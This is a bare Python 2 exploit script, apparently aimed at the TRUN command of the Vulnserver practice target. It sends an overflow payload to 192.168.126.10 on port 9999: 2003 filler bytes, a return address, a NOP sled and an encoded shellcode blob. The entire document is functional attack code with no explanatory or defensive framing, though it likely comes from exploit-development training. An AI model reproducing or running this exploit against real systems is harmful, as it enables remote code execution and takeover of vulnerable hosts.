#!/usr/bin/python
import sys, socket
from time import sleep

overflow =("\xdb\xc3\xbf\x12\xce\x38\x39\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x7a\x17\x83\xea\xfc\x03\x68\xdd\xda\xcc\x70\x09\x98"
"\x2f\x88\xca\xfd\xa6\x6d\xfb\x3d\xdc\xe6\xac\x8d\x96\xaa\x40"
"\x65\xfa\x5e\xd2\x0b\xd3\x51\x53\xa1\x05\x5c\x64\x9a\x76\xff"
"\xe6\xe1\xaa\xdf\xd7\x29\xbf\x1e\x1f\x57\x32\x72\xc8\x13\xe1"
"\x62\x7d\x69\x3a\x09\xcd\x7f\x3a\xee\x86\x7e\x6b\xa1\x9d\xd8"
"\xab\x40\x71\x51\xe2\x5a\x96\x5c\xbc\xd1\x6c\x2a\x3f\x33\xbd"
"\xd3\xec\x7a\x71\x26\xec\xbb\xb6\xd9\x9b\xb5\xc4\x64\x9c\x02"
"\xb6\xb2\x29\x90\x10\x30\x89\x7c\xa0\x95\x4c\xf7\xae\x52\x1a"
"\x5f\xb3\x65\xcf\xd4\xcf\xee\xee\x3a\x46\xb4\xd4\x9e\x02\x6e"
"\x74\x87\xee\xc1\x89\xd7\x50\xbd\x2f\x9c\x7d\xaa\x5d\xff\xe9"
"\x1f\x6c\xff\xe9\x37\xe7\x8c\xdb\x98\x53\x1a\x50\x50\x7a\xdd"
"\x97\x4b\x3a\x71\x66\x74\x3b\x58\xad\x20\x6b\xf2\x04\x49\xe0"
"\x02\xa8\x9c\xa7\x52\x06\x4f\x08\x02\xe6\x3f\xe0\x48\xe9\x60"
"\x10\x73\x23\x09\xbb\x8e\xa4\xf6\x94\xe7\x4a\x9f\xe6\x07\xa2"
"\x03\x6e\xe1\xae\xab\x26\xba\x46\x55\x63\x30\xf6\x9a\xb9\x3d"
"\x38\x10\x4e\xc2\xf7\xd1\x3b\xd0\x60\x12\x76\x8a\x27\x2d\xac"
"\xa2\xa4\xbc\x2b\x32\xa2\xdc\xe3\x65\xe3\x13\xfa\xe3\x19\x0d"
"\x54\x11\xe0\xcb\x9f\x91\x3f\x28\x21\x18\xcd\x14\x05\x0a\x0b"
"\x94\x01\x7e\xc3\xc3\xdf\x28\xa5\xbd\x91\x82\x7f\x11\x78\x42"
"\xf9\x59\xbb\x14\x06\xb4\x4d\xf8\xb7\x61\x08\x07\x77\xe6\x9c"
"\x70\x65\x96\x63\xab\x2d\xb6\x81\x79\x58\x5f\x1c\xe8\xe1\x02"
"\x9f\xc7\x26\x3b\x1c\xed\xd6\xb8\x3c\x84\xd3\x85\xfa\x75\xae"
"\x96\x6e\x79\x1d\x96\xba")

shellcode =  "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.126.10',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close()

    except:
        print "Error connecting to server" 
        sys.exit()
